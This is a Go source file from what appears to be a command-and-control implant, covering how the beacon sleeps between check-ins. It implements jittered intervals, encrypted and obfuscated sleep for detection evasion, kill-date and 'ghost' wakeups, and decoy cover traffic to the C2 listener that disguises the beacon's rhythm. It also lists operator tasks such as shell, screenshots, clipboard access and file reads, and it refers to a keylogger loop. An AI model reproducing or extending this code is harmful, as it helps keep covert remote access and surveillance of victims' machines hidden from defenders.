package main

import (
	"runtime"
	"time"
)

// beaconWakeCh wakes an interruptible sleep early (ghost transitions,
// kill-date expiry). Buffered size 1: senders never block.
var beaconWakeCh = make(chan struct{}, 1)

// requestBeaconWake nudges the main loop out of a long sleep.
func requestBeaconWake() {
	select {
	case beaconWakeCh <- struct{}{}:
	default:
	}
}

// wakeBeaconLoop interrupts either sleep path the main loop can be in: the
// interruptible helper (backoff/ghost slices) listens on beaconWakeCh, while
// the regular sleep listens on beaconWake. Used by the network-change monitor.
func wakeBeaconLoop() {
	select {
	case beaconWake <- struct{}{}:
	default:
	}
	select {
	case beaconWakeCh <- struct{}{}:
	default:
	}
}

// sleepInterruptible sleeps up to d, returning early on a wake request.
func sleepInterruptible(d time.Duration) {
	if d <= 0 {
		return
	}
	select {
	case <-time.After(d):
	case <-beaconWakeCh:
	}
}

func sleepWithJitter() {
	// Use sleep variator for non-default modes
	mode := getSleepMode()
	if mode != SleepModeDefault && mode != SleepModeInteractive {
		duration := computeSleepDuration()
		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		waitForBeaconWake(duration)
		return
	}

	// Use JIT scheduler on Windows if available
	if runtime.GOOS == "windows" && beaconSched != nil {
		if beaconSched.ShouldBeaconNow() {
			return
		}
		duration := beaconSched.ComputeNext()

		if sleepMaskActive {
			sleepWithMask(duration)
			return
		}
		if evasionEnabled {
			sleepObfuscated(duration)
			return
		}
		// Interruptible so a network change (agent_netwake.go), ghost
		// transition or kill-date wake is observed promptly even when the JIT
		// scheduler owns the cadence.
		waitForBeaconWake(duration)
		return
	}

	// Interval 0 = interactive mode (tight beacon loop for shell/UI).
	if Interval <= 0 {
		d := 200 * time.Millisecond
		if inFastMode.Load() {
			d = 50 * time.Millisecond
		}
		waitForBeaconWake(d)
		return
	}
	baseInterval := Interval
	if inFastMode.Load() {
		baseInterval = FastInterval
	}
	base := time.Duration(baseInterval) * time.Second
	jit := float64(Jitter) / 100.0

	// Use enhanced randomization if configured
	nextInterval := computeBeaconIntervalWithMode(base, jit)

	// Apply max random cap against the same base the distribution used.
	nextInterval = applyMaxRandomCap(base, nextInterval)

	// Bound from below: a symmetric distribution can push a beacon near-or-below
	// zero, which the sleep helpers treat as "return now" — a self-inflicted
	// beacon storm. Floor at 1s (>= 10% of base for long cadences).
	nextInterval = floorBeaconInterval(base, nextInterval)

	// If Sleep Mask is initialized, use encrypted sleep
	if sleepMaskActive {
		sleepWithMask(nextInterval)
		return
	}
	if evasionEnabled {
		sleepObfuscated(nextInterval)
		return
	}
	waitForBeaconWake(nextInterval)
}

func waitForBeaconWake(duration time.Duration) {
	// Guard against non-positive durations (e.g. extreme negative jitter) which
	// would panic time.NewTimer or busy-loop. Interactive fast mode legitimately
	// passes sub-second values, so only floor at zero here.
	if duration < 0 {
		duration = 0
	}
	// Cover traffic: sprinkle decoy requests to the C2 listener at a random
	// point inside the sleep window so the beacon cadence is less regular.
	// getActiveCoverTraffic() returns false unless an operator opted in.
	if duration > 0 {
		if enabled, _ := getActiveCoverTraffic(); enabled {
			go func() {
				d := time.Duration(rng.Int63n(int64(duration)))
				time.Sleep(d)
				sendCoverTrafficBurst()
			}()
		}
	}
	timer := time.NewTimer(duration)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-beaconWake:
	}
}

func checkFastMode(tasks []Task) {
	inFastMode.Store(false)
	fastTypes := map[string]bool{
		"screenshot": true, "screenshot_window": true, "shell": true, "ps": true,
		"clipboard_get": true, "clipboard_set": true, "find": true, "drives": true,
		"services": true, "beacon_now": true, "ls": true, "read": true,
		"mkdir": true, "rename": true, "chmod": true,
	}
	for _, task := range tasks {
		if fastTypes[task.Type] {
			inFastMode.Store(true)
			return
		}
	}
}

// beaconBackoffSec returns the base backoff (seconds) for a given number of
// consecutive beacon failures. The exponent is clamped so the left shift can
// never overflow int64 (1<<63 at 64 failures) and the result stays positive
// and bounded by the 300s ceiling.
func beaconBackoffSec(failures int) int {
	if failures <= 0 {
		return 0
	}
	exp := failures - 1
	if exp > 9 {
		exp = 9
	}
	backoff := 1 << uint(exp)
	if backoff > 300 {
		backoff = 300
	}
	return backoff
}

// setDPIAware, captureScreenRGBA and keyloggerLoop are provided exclusively by
// platform-specific files (agent_windows.go / agent_linux.go) via build tags.
